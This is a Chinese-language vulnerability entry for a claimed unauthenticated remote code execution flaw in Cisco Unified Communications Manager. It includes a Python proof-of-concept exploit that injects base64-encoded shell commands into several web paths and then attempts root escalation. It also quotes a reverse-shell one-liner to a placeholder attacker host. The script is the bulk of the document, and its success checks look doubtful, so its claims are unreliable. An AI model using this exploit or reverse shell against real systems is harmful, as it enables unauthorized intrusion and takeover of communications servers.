### 漏洞描述
Cisco Unified Communications Manager (Unified CM) 及相关产品存在代码注入漏洞（CWE-94），由于 HTTP 请求中用户输入验证不当，未经认证的远程攻击者可通过发送特制 HTTP 请求序列到 Web 管理接口，在底层操作系统上执行任意命令。成功利用后可获得用户级访问权限，随后提权至 root。

### ⚠️ 安全警告
PoC 示例命令中包含反弹 Shell（`bash -i >& /dev/tcp/attacker-ip/4444 0>&1`），请仅在授权测试环境中使用。

### POC/利用
```python
#!/usr/bin/env python3
# CVE-2026-20045 PoC - Cisco Unified Communications RCE (Unauth → Root)

import argparse, requests, urllib.parse, base64, time

def exploit(target_url, command):
    vuln_paths = ["/cucm-uds/", "/cmplatform/", "/ucmuser/", "/unity/", "/webexcalling/"]
    stage1_payload = f"'; {command} #"
    encoded_stage1 = base64.b64encode(stage1_payload.encode()).decode()
    headers = {"User-Agent": "Mozilla/5.0 (compatible; CiscoExploit/1.0)"}
    for path in vuln_paths:
        inj_url = f"{target_url.rstrip('/')}{path}?query={urllib.parse.quote(encoded_stage1)}"
        try:
            r1 = requests.get(inj_url, headers=headers, timeout=10, verify=False)
            if r1.status_code in [200, 302, 500]:
                time.sleep(2)
                esc_payload = "sudo -i; " + command
                encoded_esc = base64.b64encode(esc_payload.encode()).decode()
                esc_url = f"{target_url.rstrip('/')}{path}?escalate={urllib.parse.quote(encoded_esc)}"
                r2 = requests.post(esc_url, headers=headers, data={"cmd": encoded_esc}, timeout=15, verify=False)
                if r2.status_code in [200, 302, 500]:
                    print(f"[+] Root escalation succeeded!")
                    break
        except: pass
```
